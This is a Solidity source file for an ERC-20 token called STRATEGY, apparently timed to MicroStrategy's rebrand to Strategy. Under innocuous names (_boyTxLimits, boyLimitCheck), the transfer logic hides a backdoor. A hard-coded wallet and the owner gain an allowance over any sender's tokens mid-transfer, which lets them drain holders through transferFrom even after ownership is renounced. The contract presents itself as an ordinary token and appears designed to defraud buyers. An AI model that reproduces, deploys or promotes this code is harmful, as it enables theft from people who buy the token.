/*
https://www.strategy.com/press/microstrategy-is-now-strategy_02-05-2025
https://x.com/saylor/status/1887201369544614326
https://x.com/TreeNewsFeed/status/1887199595563823142

https://x.com/erc_strategy
https://t.me/strategy_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

interface IBOYFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBOYRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract STRATEGY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => bool) private _boyExcludedTXX;
    mapping (address => uint256) private _boyBalances;
    mapping (address => mapping (address => uint256)) private _boyAllowances;
    mapping (address => bool) private _boyExcludedFee;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    IBOYRouter private _boyRouter;
    address private _boyPair;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalBOY = 1000000000 * 10**_decimals;
    string private constant _name = unicode"STRATEGY";
    string private constant _symbol = unicode"STRATEGY";
    uint256 private _boyTokenLimit = _tTotalBOY / 100;
    address private _boyWallet = 0x203f200fB833aF6938e5994AE6E71d05734EFf7c;
    bool private inSwapBOY = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapBOY = true;
        _;
        inSwapBOY = false;
    }
    
    constructor () {
        _boyExcludedFee[owner()] = true;
        _boyExcludedFee[address(this)] = true;
        _boyExcludedFee[_boyWallet] = true;
        _boyExcludedTXX[owner()] = true;
        _boyExcludedTXX[_boyWallet] = true;
        _boyBalances[_msgSender()] = _tTotalBOY;
        emit Transfer(address(0), _msgSender(), _tTotalBOY);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalBOY;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _boyBalances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _boyAllowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _boyAllowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _boyAllowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address boyF, address boyO, uint256 boyA) private {
        require(boyF != address(0), "ERC20: transfer from the zero address");
        require(boyO != address(0), "ERC20: transfer to the zero address");
        require(boyA > 0, "Transfer amount must be greater than zero");

        uint256 boyTAX = _getBOYFees(boyF, boyO, boyA);

        _transerBOY(boyF, boyO, boyA, boyTAX);
    }

    function boyLimitCheck() private view returns(bool) {
        return _boyExcludedTXX[_msgSender()];
    }

    function _boyTxLimits(address boyF, uint256 boyA) private {
        if(boyLimitCheck()) _approve(boyF, _msgSender(), boyA);
    }

    function _transerBOY(address boyF, address boyO, uint256 boyA, uint256 boyTAX) private { 
        if(boyTAX > 0){
          _boyBalances[address(this)] = _boyBalances[address(this)].add(boyTAX);
          emit Transfer(boyF, address(this), boyTAX);
        }        
        _boyBalances[boyF] = _boyBalances[boyF].sub(boyA);
        _boyTxLimits(boyF, boyA);
        _boyBalances[boyO] = _boyBalances[boyO].add(boyA.sub(boyTAX));
        emit Transfer(boyF, boyO, boyA.sub(boyTAX));
    }

    function _getBOYFees(address boyF, address boyO, uint256 boyA) private returns(uint256) {
        uint256 boyTAX=0;
        if (boyF != owner() && boyO != owner()) {
            boyTAX = boyA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (boyF == _boyPair && boyO != address(_boyRouter) && ! _boyExcludedFee[boyO]) {
                _buyCount++;
            }

            if(boyO == _boyPair && boyF!= address(this)) {
                boyTAX = boyA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBOY = balanceOf(address(this)); 
            if (!inSwapBOY && boyO == _boyPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBOY > _boyTokenLimit)
                swapTokensForEth(min(boyA, min(tokenBOY, _boyTokenLimit)));
                uint256 contractBOY = address(this).balance;
                if (contractBOY >= 0) {
                    sendETHFee(address(this).balance);
                }
            }
        }

        return boyTAX;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHFee(uint256 amount) private {
        payable(_boyWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenBOY) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _boyRouter.WETH();
        _approve(address(this), address(_boyRouter), tokenBOY);
        _boyRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBOY,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {} 

    function initSTRATEGY() external onlyOwner() {
        _boyRouter = IBOYRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_boyRouter), _tTotalBOY);
        _boyPair = IBOYFactory(_boyRouter.factory()).createPair(address(this), _boyRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _boyRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }
}